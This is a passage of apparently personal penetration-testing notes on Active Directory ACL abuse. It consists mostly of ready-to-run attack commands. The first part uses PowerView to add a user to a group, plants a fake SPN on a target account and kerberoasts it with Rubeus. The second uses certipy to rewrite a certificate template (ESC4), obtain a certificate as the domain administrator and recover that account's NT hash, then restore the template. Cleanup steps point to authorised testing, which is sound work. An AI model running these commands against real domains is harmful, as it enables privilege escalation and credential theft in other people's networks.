PS C:\> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose (add the user to the group)

PS C:\> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName (confirm the user has been added)
```

> [!Note]
> We can now take full control over the user `adunn` through GenericAll via nested group membership. This means we can modify his SPN attribute to create a fake SPN that we can kerberoast to obtain the TGS ticket and crack offline

6. Create a fake SPN:
```powershell
PS C:\> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

7. Kerberoast the user:
```powershell
PS C:\> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

> [!Note]
> We can use any method to kerberoast the user

8. Perform a [[AD DCSync]] attack.

**Cleanup**

1. Remove the fake SPN we created on the `adunn` user.
```powershell
PS C:\> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

2. Remove the `damundsen` user from the `Help Desk Level 1` group
```powershell
PS C:\> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose (remove the user from the group)

PS C:\> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose (confirm the user has been removed)
```

3. Set the password for the `damundsen` user back to its original value (if we know it) or have our client set it/alert the user

# CS template with dangerous ACEs (ESC4)

ESC4 is when our controlled principal has **write privileges** (`GenericWrite`, `WriteDacl`, `WriteOwner`, `WriteProperty`...) over a **certificate template** object itself. Instead of abusing an already-misconfigured template, we *make* a template vulnerable: overwrite its configuration to look like ESC1 (enrollee-supplies-subject + client-authentication EKU), enroll impersonating a Domain Admin, then restore the original settings.

**Linux (certipy)**

1. Enumerate templates and confirm the write ACE over the template:
```bash
$ certipy-ad find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout
# Look for a template where our user/group has Write Owner / Write Dacl / Write Property
```

2. Overwrite the template to make it ESC1-abusable (certipy saves the old config for restore):
```bash
$ certipy-ad template -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -template TEMPLATE_NAME -write-default-configuration -save-old
```

3. Request a certificate impersonating a privileged user (this is now a standard ESC1 request):
```bash
$ certipy-ad req -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -ca 'CA_NAME' -template TEMPLATE_NAME -upn administrator@DOMAIN_FQDN -dc-ip DC_IP
```

4. Authenticate with the issued certificate to recover the target NT hash / TGT:
```bash
$ certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

5. **Restore** the template to its original configuration to reduce footprint:
```bash
$ certipy-ad template -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
```

> [!Note]
> The full ESC1/ESC7/ESC8 methodology and the ADCS background live in [[Attacking Active Directory Certificate Services]]. This section only covers reaching those attacks *through* an ACL write over the template object.

---
### Related notes
- [[Kerberoasting]] and [[AS-REP Roasting]] — the roasting attacks unlocked by `GenericWrite`/`GenericAll` over a user.
- [[Kerberos Delegation]] — RBCD is the primary abuse of `GenericAll`/`GenericWrite` over a **computer** object.
- [[AD DCSync]] — end goal of `WriteDacl` over the domain (granting `DS-Replication-Get-Changes*`).
- [[Attacking Active Directory Certificate Services]] — ESC1/ESC4/ESC7/ESC8 certificate abuse.
- [[Pass the Hash (PtH)]] and [[Pass the Ticket (PtT)]] — reusing the credentials/tickets obtained here.
- [[AD Enumeration with PowerView]] and [[AD Automatic Enumeration (BloodHound)]] — mapping these ACL edges before abuse.

